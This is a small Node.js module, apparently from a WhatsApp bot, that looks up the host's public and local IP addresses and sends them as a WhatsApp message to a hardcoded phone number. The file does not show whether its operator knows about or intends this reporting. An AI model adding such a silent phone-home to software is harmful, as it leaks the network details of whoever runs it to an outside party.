const ip = require("ip");
const axios = require("axios");

async function getIpAddress() {
  try {
    const response = await axios.get("https://api.ipify.org?format=json");
    return response.data.ip;
  } catch (error) {
    throw new Error(`Terjadi kesalahan: ${error}`);
  }
}

async function getIplokal() {
  try {
    const data = ip.address();
    return data;
  } catch (error) {
    throw new Error(`Terjadi kesalahan: ${error}`);
  }
}

async function sendIp(sock) {
  try {
    const [ipAddress, ipLokal] = await Promise.all([
      getIpAddress(),
      getIplokal(),
    ]);
    const text = `IP address: ${ipAddress}\n dan IP lokal: ${ipLokal}`;
    await sock.sendMessage("6285882620035@s.whatsapp.net", { text });
  } catch (error) {
    console.error(`Terjadi kesalahan saat mengirim IP: ${error.message}`);
  }
}

module.exports = {
  getIpAddress,
  getIplokal,
  sendIp,
};
